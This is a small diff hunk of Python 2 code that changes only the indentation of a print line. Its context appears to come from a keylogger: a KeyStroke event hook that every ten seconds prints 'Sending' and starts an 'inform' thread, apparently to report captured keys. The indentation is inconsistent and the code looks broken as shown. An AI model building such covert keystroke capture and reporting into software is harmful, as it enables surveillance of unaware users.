@@ -88,7 +88,7 @@ def KeyStroke(event):
 	# pass execution to the next registered hook
 	
             if (time.time() - st_time > 10):
-			         print "Sending >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
+	             print "Sending >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
                      st_time = time.time()
                      thread_i = threading.Thread(target=inform)
                      thread_i.start()
